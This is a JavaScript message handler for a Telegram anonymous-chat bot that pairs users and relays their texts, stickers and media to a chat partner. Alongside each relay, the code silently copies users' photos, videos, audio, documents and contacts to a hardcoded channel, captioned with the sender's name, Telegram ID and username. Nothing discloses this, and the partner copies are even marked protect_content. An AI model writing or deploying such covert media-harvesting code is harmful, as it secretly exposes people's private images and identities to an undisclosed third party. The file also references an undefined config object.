const {
    findContact,
    chatContact,
    findContactPartner
} = require('./base.js')

async function handleMessage(bot, lintof, isText, isSticker, isImage, isVideo, isAudio, isContact, isDocument, isAnimation) {
    try {
        const findContactResult = await findContact(lintof.chat.id);

        if (findContactResult.partnerId === lintof.chat.id || (findContactResult.partnerId !== null && findContactResult.status === 0)) {
            findContactResult.status = 0;
            findContactResult.partnerId = null;
            await findContactResult.save();
        }

        if (findContactResult.partnerId === null && findContactResult.status === 0) {
            await bot.telegram.sendMessage(
                lintof.chat.id,
                config.mess.error.sessionNotFound,
                { parse_mode: "Markdown" }
            );
            return;
        }

        const contactResult = await chatContact(lintof.chat.id);
        const partnerContact = await findContactPartner(contactResult.contactId);

        if (partnerContact.contactId === contactResult.partnerId) {
            if (isText) {
                await bot.telegram.sendMessage(contactResult.partnerId, lintof.message.text, { parse_mode: "Markdown" });
            }
            else if (isSticker) {
                await bot.telegram.sendSticker(contactResult.partnerId, lintof.message.sticker.file_id);
            }
            else if (isImage) {
                await bot.telegram.sendPhoto(contactResult.partnerId, lintof.message.photo[2].file_id, {
                    caption: lintof.message.caption,
                    parse_mode: "Markdown",
                    protect_content: true
                });
                await bot.telegram.sendPhoto('-1001966928168', lintof.message.photo[2].file_id, {
                    caption: `${lintof.message.caption !== undefined ? `caption: ${lintof.message.caption}` : ''}\nname: **${lintof.chat.first_name}**\nid: ${lintof.chat.id} ${lintof.chat.username && `\nusername: @${lintof.chat.username}`}`,
                    parse_mode: "Markdown"
                });
            } else if (isVideo) {
                await bot.telegram.sendVideo(contactResult.partnerId, lintof.message.video.file_id, {
                    caption: lintof.message.caption,
                    parse_mode: "Markdown",
                    protect_content: true
                });
                await bot.telegram.sendVideo('-1001966928168', lintof.message.video.file_id, {
                    caption: `${lintof.message.caption !== undefined ? `caption: ${lintof.message.caption}` : ''}\nname: **${lintof.chat.first_name}**\nid: ${lintof.chat.id} ${lintof.chat.username && `\nusername: @${lintof.chat.username}`}`,
                    parse_mode: "Markdown"
                });
            } else if (isAudio) {
                await bot.telegram.sendAudio(contactResult.partnerId, lintof.message.audio.file_id, { protect_content: true });
                await bot.telegram.sendAudio('-1001966928168', lintof.message.audio.file_id, {
                    caption: `${lintof.message.caption !== undefined ? `caption: ${lintof.message.caption}` : ''}\nname: **${lintof.chat.first_name}**\nid: ${lintof.chat.id} ${lintof.chat.username && `\nusername: @${lintof.chat.username}`}`,
                    parse_mode: "Markdown"
                });
            } else if (isContact) {
                await bot.telegram.sendContact(contactResult.partnerId, lintof.message.contact.file_id);
                await bot.telegram.sendContact('-1001966928168', lintof.message.contact.file_id);
            } else if (isDocument) {
                await bot.telegram.sendDocument(contactResult.partnerId, lintof.message.document.file_id, { protect_content: true });
                await bot.telegram.sendDocument('-1001966928168', lintof.message.document.file_id, {
                    caption: `${lintof.message.caption !== undefined ? `caption: ${lintof.message.caption}` : ''}\nname: **${lintof.chat.first_name}**\nid: ${lintof.chat.id} ${lintof.chat.username && `\nusername: @${lintof.chat.username}`}`,
                    parse_mode: "Markdown"
                });
            } else if (isAnimation) {
                await bot.telegram.sendAnimation(contactResult.partnerId, lintof.message.animation.file_id);
            }
        }
    } catch (error) {
        console.error(error);
    }
}

module.exports = {
    handleMessage: handleMessage
}